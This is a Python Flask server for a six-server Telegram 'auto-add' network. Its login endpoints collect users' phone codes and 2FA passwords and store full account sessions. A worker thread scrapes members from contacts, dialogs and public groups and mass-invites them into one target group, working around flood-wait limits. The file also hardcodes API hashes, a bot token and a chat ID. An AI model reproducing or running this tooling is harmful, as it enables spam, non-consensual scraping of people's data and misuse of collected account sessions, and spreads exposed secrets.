#!/usr/bin/env python3
"""
Telegram Auto-Add Server - Multi-Server Ranking System
6 Servers with Statistics & Percent Reports
ULTRA AGGRESSIVE MODE - Maximum add speed
"""

from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ============================================
# CHANGE ONLY THIS NUMBER PER SERVER
# ============================================
SERVER_NUMBER = 3  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum, 6=abel

# ============================================
# ALL CREDENTIALS HARDCODED - CORRECT ONES
# ============================================
SERVERS = {
    1: {
        'name': 'Dil',
        'api_id': 35790598,
        'api_hash': 'fa9f62d821f04b03d76d53175e367736',
        'url': 'https://dilbedil.onrender.com'
    },
    2: {
        'name': 'sofu',
        'api_id': 36274756,
        'api_hash': 'b70311a2b3547e1ce40e72081dc726dc',
        'url': 'https://sofuu.onrender.com'
    },
    3: {
        'name': 'bebby',
        'api_id': 31590358,
        'api_hash': '072edc73e0f4003ddcba1c41d24adb02',
        'url': 'https://bebby.onrender.com'
    },
    4: {
        'name': 'kaleb',
        'api_id': 37539842,
        'api_hash': 'a9927e01c5023bf828fe753895d5731b',
        'url': 'https://kaleb.onrender.com'
    },
    5: {
        'name': 'fitsum',
        'api_id': 33441396,
        'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95',
        'url': 'https://fitsum.onrender.com'
    },
    6: {
        'name': 'abel',
        'api_id': 37539842,
        'api_hash': 'a9927e01c5023bf828fe753895d5731b',
        'url': 'https://e-gram-98zv.onrender.com'
    }
}

# Bot for reports
BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUP = 'Abe_armygroup'

# Pick current server
CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']

OTHER_SERVERS = [{'name': SERVERS[i]['name'], 'url': SERVERS[i]['url'], 'num': i} for i in SERVERS if i != SERVER_NUMBER]

PORT = int(os.environ.get('PORT', 10000))

# ============================================
# STORAGE
# ============================================
accounts = []
temp_sessions = {}
auto_add_settings = {}
active_clients = {}
running_tasks = {}

stats = {
    'total_added': 0,
    'today_added': 0,
    'hourly': {},
    'last_reset': datetime.now().strftime('%Y-%m-%d'),
    'started_at': datetime.now().isoformat()
}

ACCOUNTS_FILE = 'accounts.json'
SETTINGS_FILE = 'auto_add_settings.json'
STATS_FILE = 'stats.json'

def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path) as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except:
        pass
    return default

def save_json(path, data):
    try:
        with open(path, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")

def load_all():
    global accounts, auto_add_settings, stats
    accounts = load_json(ACCOUNTS_FILE, [])
    auto_add_settings = load_json(SETTINGS_FILE, {})
    stats = load_json(STATS_FILE, {
        'total_added': 0, 'today_added': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'),
        'daily_history': {},
        'started_at': datetime.now().isoformat()
    })
    logger.info(f"Loaded: {len(accounts)} accounts, settings: {len(auto_add_settings)}")

load_all()

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

def reset_daily():
    today = datetime.now().strftime('%Y-%m-%d')
    if stats.get('last_reset') != today:
        stats['daily_history'][stats.get('last_reset', today)] = stats.get('today_added', 0)
        stats['today_added'] = 0
        stats['last_reset'] = today
        save_json(STATS_FILE, stats)

def send_telegram(text):
    try:
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', json={
            'chat_id': REPORT_CHAT_ID, 'text': text, 'parse_mode': 'HTML'
        }, timeout=10)
    except:
        pass

# ============================================
# AGGRESSIVE AUTO-ADD ENGINE
# ============================================
def auto_add_worker(account):
    """ULTRA AGGRESSIVE: No limits, max speed, multi-source"""
    acc_id = account['id']
    acc_key = str(acc_id)
    session_str = account['session']
    attempted = set()
    joined = False
    cycle_count = 0
    
    logger.info(f"🔥 AGGRESSIVE AUTO-ADD STARTED: {account.get('name')} -> @{TARGET_GROUP}")
    
    while True:
        try:
            settings = auto_add_settings.get(acc_key, {})
            if not settings.get('enabled', True):
                time.sleep(30)
                continue
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                client = TelegramClient(
                    StringSession(session_str), API_ID, API_HASH,
                    connection_retries=10, retry_delay=2, timeout=30
                )
                loop.run_until_complete(client.connect())
                
                if not loop.run_until_complete(client.is_user_authorized()):
                    logger.error(f"Account {acc_id} not authorized")
                    loop.close()
                    time.sleep(60)
                    continue
                
                # Auto-join group
                if not joined:
                    try:
                        grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                        loop.run_until_complete(client(JoinChannelRequest(grp)))
                        joined = True
                        logger.info(f"✅ Joined @{TARGET_GROUP}")
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            joined = True
                        else:
                            logger.warning(f"Join error: {e}")
                
                # Get target group
                try:
                    group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                except:
                    logger.error("Cannot find target group")
                    loop.close()
                    time.sleep(120)
                    continue
                
                # Collect members from ALL sources
                all_ids = set()
                
                # Contacts
                try:
                    contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                    for c in contacts.users:
                        if c.id and not c.bot:
                            all_ids.add(c.id)
                    logger.info(f"📱 Contacts: {len(all_ids)}")
                except Exception as e:
                    logger.error(f"Contacts error: {e}")
                
                # Dialogs
                try:
                    dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id and not d.entity.bot:
                            all_ids.add(d.entity.id)
                    logger.info(f"💬 Dialogs total: {len(all_ids)}")
                except Exception as e:
                    logger.error(f"Dialogs error: {e}")
                
                # Source groups for scraping
                source_groups = [
                    '@telegram', '@durov', '@TelegramTips', '@contest',
                    '@TelegramNews', '@tginfo', '@tgcodes'
                ]
                for sg in source_groups:
                    try:
                        sge = loop.run_until_complete(client.get_entity(sg))
                        count = 0
                        async for u in client.iter_participants(sge, limit=300):
                            if u.id and not u.bot:
                                all_ids.add(u.id)
                                count += 1
                        logger.info(f"👥 {sg}: +{count} members")
                    except Exception as e:
                        logger.debug(f"{sg}: {e}")
                
                # Filter fresh
                fresh = list(all_ids - attempted)
                if not fresh or len(fresh) < 10:
                    attempted.clear()
                    fresh = list(all_ids)
                
                random.shuffle(fresh)
                
                cycle_count += 1
                added_this_cycle = 0
                delay = max(6, settings.get('delay_seconds', 12))  # AGGRESSIVE: min 6s
                
                logger.info(f"🔄 Cycle {cycle_count}: {len(fresh)} total, attempting to add...")
                
                for uid in fresh[:500]:  # Max 500 per cycle
                    settings_check = auto_add_settings.get(acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    if uid in attempted and len(attempted) < len(all_ids) - 100:
                        continue
                    
                    attempted.add(uid)
                    
                    try:
                        user = loop.run_until_complete(client.get_input_entity(uid))
                        loop.run_until_complete(client(InviteToChannelRequest(group, [user])))
                        
                        stats['today_added'] = stats.get('today_added', 0) + 1
                        stats['total_added'] = stats.get('total_added', 0) + 1
                        added_this_cycle += 1
                        
                        if added_this_cycle % 25 == 0:
                            save_json(STATS_FILE, stats)
                            logger.info(f"✅ +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
                        
                        # Random delay
                        actual_delay = random.uniform(delay * 0.6, delay * 1.4)
                        time.sleep(actual_delay)
                        
                    except errors.FloodWaitError as e:
                        logger.warning(f"⏳ Flood {e.seconds}s")
                        time.sleep(e.seconds + 3)
                    except errors.UserPrivacyRestrictedError:
                        continue
                    except errors.UserNotMutualContactError:
                        continue
                    except errors.UserAlreadyParticipantError:
                        continue
                    except errors.UserKickedError:
                        continue
                    except errors.UserBannedInChannelError:
                        continue
                    except Exception as e:
                        logger.debug(f"Skip {uid}: {e}")
                        continue
                
                logger.info(f"📊 Cycle done: +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
                save_json(STATS_FILE, stats)
                
                # Send progress to bot
                if added_this_cycle > 50 or cycle_count % 5 == 0:
                    send_telegram(
                        f"📊 <b>{SERVER_NAME}</b>\n"
                        f"🔄 Cycle: {cycle_count}\n"
                        f"✅ This cycle: {added_this_cycle}\n"
                        f"📅 Today: {stats['today_added']:,}\n"
                        f"📊 Total: {stats['total_added']:,}\n"
                        f"🎯 @{TARGET_GROUP}"
                    )
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                try:
                    loop.run_until_complete(client.disconnect())
                except:
                    pass
                loop.close()
            
            # Rest between cycles
            rest = random.randint(30, 120)
            logger.info(f"😴 Resting {rest}s...")
            time.sleep(rest)
            
        except Exception as e:
            logger.error(f"Worker critical error: {e}")
            time.sleep(120)

def start_auto_add(account):
    if str(account['id']) in running_tasks:
        return
    t = threading.Thread(target=auto_add_worker, args=(account,), daemon=True)
    t.start()
    running_tasks[str(account['id'])] = t
    logger.info(f"🚀 Started auto-add for {account.get('name', '?')}")

# ============================================
# FLASK ROUTES
# ============================================
@app.route('/')
@app.route('/auto-add')
def index():
    if os.path.exists('auto_add.html'):
        return send_file('auto_add.html')
    return jsonify({'error': 'auto_add.html not found'})

@app.route('/login')
def login_page():
    if os.path.exists('login.html'):
        return send_file('login.html')
    return jsonify({'error': 'login.html not found'})

@app.route('/dashboard')
@app.route('/dash')
@app.route('/all')
def other_pages():
    if os.path.exists('auto_add.html'):
        return send_file('auto_add.html')
    return jsonify({'error': 'page not found'})

@app.route('/ping')
@app.route('/api/health')
def health():
    reset_daily()
    return jsonify({
        'status': 'ok',
        'server': SERVER_NAME,
        'number': SERVER_NUMBER,
        'accounts': len(accounts),
        'today': stats.get('today_added', 0),
        'total': stats.get('total_added', 0)
    })

@app.route('/api/public-stats')
def public_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'stats': {
            'name': SERVER_NAME,
            'server_number': SERVER_NUMBER,
            'today': stats.get('today_added', 0),
            'total': stats.get('total_added', 0),
            'active_accounts': len(accounts),
            'target_group': TARGET_GROUP,
            'url': SERVER_URL
        }
    })

@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP,
            'total_servers': len(SERVERS),
            'other_servers': OTHER_SERVERS
        }
    })

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time()))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                logger.info(f"Code sent to {phone}")
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired. Go back and try again.'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True
                }
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                # Enable auto-add immediately
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUP,
                    'delay_seconds': 12,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                # Auto-join group
                try:
                    grp = await client.get_entity(TARGET_GROUP)
                    await client(JoinChannelRequest(grp))
                    logger.info(f"✅ New account joined @{TARGET_GROUP}")
                except Exception as e:
                    if 'already' not in str(e).lower():
                        logger.warning(f"Join error: {e}")
                
                # Start worker
                start_auto_add(new_acc)
                
                return {
                    'success': True,
                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_add_started': True
                }
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired. Request new one.'}
            except errors.PasswordHashInvalidError:
                return {'success': False, 'error': 'Wrong 2FA password'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(verify())
        if sid in temp_sessions:
            del temp_sessions[sid]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts')
def get_accounts():
    return jsonify({
        'success': True,
        'accounts': [{
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(str(a['id']), {}).get('enabled', True)
        } for a in accounts]
    })

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    global accounts
    aid = request.json.get('accountId')
    accounts = [a for a in accounts if a['id'] != aid]
    auto_add_settings.pop(str(aid), None)
    running_tasks.pop(str(aid), None)
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        s = auto_add_settings.get(str(aid), {
            'enabled': False,
            'target_group': TARGET_GROUP,
            'delay_seconds': 12
        })
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
    auto_add_settings[akey] = {
        'enabled': data.get('enabled', False),
        'target_group': data.get('target_group', TARGET_GROUP),
        'delay_seconds': max(6, data.get('delay_seconds', 12)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if data.get('enabled') and not was_on:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    
    return jsonify({'success': True})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'server_number': SERVER_NUMBER
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        aid = request.json.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Not authorized'}
                
                group_found = False
                group_title = TARGET_GROUP
                try:
                    grp = await client.get_entity(TARGET_GROUP)
                    group_found = True
                    group_title = getattr(grp, 'title', TARGET_GROUP)
                except:
                    pass
                
                available = 0
                try:
                    contacts = await client(GetContactsRequest(0))
                    available += len([c for c in contacts.users if not c.bot])
                except:
                    pass
                try:
                    dialogs = await client.get_dialogs(limit=200)
                    available += len([d for d in dialogs if d.is_user and not d.entity.bot])
                except:
                    pass
                
                return {
                    'success': True,
                    'group_found': group_found,
                    'group_title': group_title,
                    'available_members': available,
                    'target_group': TARGET_GROUP
                }
            finally:
                await client.disconnect()
        
        return jsonify(run_async(test()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/join-group', methods=['POST'])
def join_group():
    try:
        aid = request.json.get('accountId')
        grp = request.json.get('group', TARGET_GROUP)
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Not found'})
        
        async def join():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                entity = await client.get_entity(grp)
                await client(JoinChannelRequest(entity))
                return {'success': True, 'message': f'Joined {grp}'}
            except Exception as e:
                if 'already' in str(e).lower():
                    return {'success': True, 'message': 'Already member'}
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(join()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-report')
def send_report():
    reset_daily()
    
    our = {
        'name': SERVER_NAME, 'number': SERVER_NUMBER,
        'today': stats.get('today_added', 0), 'total': stats.get('total_added', 0),
        'active_accounts': len(accounts)
    }
    
    all_stats = [our]
    for srv in OTHER_SERVERS:
        try:
            r = requests.get(f"{srv['url']}/api/public-stats", timeout=10)
            if r.status_code == 200:
                d = r.json()
                if d.get('success'):
                    all_stats.append(d['stats'])
                    continue
        except:
            pass
        all_stats.append({'name': srv['name'], 'today': 0, 'total': 0, 'error': True})
    
    all_stats.sort(key=lambda x: x.get('today', 0), reverse=True)
    total_today = sum(s.get('today', 0) for s in all_stats)
    total_all = sum(s.get('total', 0) for s in all_stats)
    active_count = len([s for s in all_stats if not s.get('error')])
    
    report = f"""
📊 <b>DAILY AUTO-ADD REPORT</b>
📅 <b>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</b>
━━━━━━━━━━━━━━━━━━━━━━
🏆 <b>SERVER RANKINGS</b>
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for i, s in enumerate(all_stats, 1):
        pct = (s['today'] / total_today * 100) if total_today > 0 else 0
        medal = '🥇' if i == 1 else ('🥈' if i == 2 else ('🥉' if i == 3 else f'{i}️⃣'))
        status = '⚠️ OFFLINE' if s.get('error') else '✅ ONLINE'
        bar_len = max(1, int(pct / 33 * 20))
        bar = '█' * bar_len + '░' * (20 - bar_len)
        report += f"""
{medal} <b>{s['name']}</b> [{status}]
   {bar} <b>{s['today']:,}</b> ({pct:.1f}%)
   📅 Today: {s['today']:,} | 📊 Total: {s['total']:,}
"""
    
    report += f"""
━━━━━━━━━━━━━━━━━━━━━━
📈 <b>SUMMARY</b>
━━━━━━━━━━━━━━━━━━━━━━
• 🌐 Active: <b>{active_count}/{len(all_stats)}</b>
• 📥 Today Total: <b>{total_today:,}</b>
• 📊 All-Time: <b>{total_all:,}</b>
• 👑 Top: <b>{all_stats[0]['name']}</b> ({all_stats[0]['today']:,})
• 📈 Avg/Server: <b>{total_today // max(active_count, 1):,}</b>
━━━━━━━━━━━━━━━━━━━━━━
🤖 <i>Generated by {SERVER_NAME}</i>
"""
    
    send_telegram(report)
    return jsonify({'success': True, 'message': 'Report sent'})

# ============================================
# KEEP ALIVE & SCHEDULERS
# ============================================
def keep_alive():
    while True:
        time.sleep(240)
        try:
            requests.get(f"{SERVER_URL}/ping", timeout=10)
        except:
            pass

def daily_report_scheduler():
    last = None
    while True:
        now = datetime.now()
        today = now.strftime('%Y-%m-%d')
        if now.hour in [0, 1] and last != today:
            time.sleep(random.randint(0, 1800))
            reset_daily()
            try:
                requests.get(f"{SERVER_URL}/api/send-report", timeout=30)
            except:
                pass
            last = today
        time.sleep(300)

def restore_and_start():
    """Restore sessions and start auto-add"""
    time.sleep(5)
    for acc in accounts:
        if acc.get('session') and auto_add_settings.get(str(acc['id']), {}).get('enabled', True):
            start_auto_add(acc)
            time.sleep(2)
    logger.info(f"🚀 All accounts started for auto-add")

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════╗
║  AUTO-ADD SERVER #{SERVER_NUMBER}              ║
║  Name: {SERVER_NAME}                       ║
║  Target: @{TARGET_GROUP}          ║
║  Mode: AGGRESSIVE                 ║
║  Port: {PORT}                       ║
║  URL: {SERVER_URL} ║
╚══════════════════════════════════╝
    """)
    
    threading.Thread(target=keep_alive, daemon=True).start()
    threading.Thread(target=daily_report_scheduler, daemon=True).start()
    threading.Thread(target=restore_and_start, daemon=True).start()
    
    send_telegram(f"🟢 <b>{SERVER_NAME}</b> Online!\n📋 Server #{SERVER_NUMBER}\n🎯 @{TARGET_GROUP}\n⚡ AGGRESSIVE MODE")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
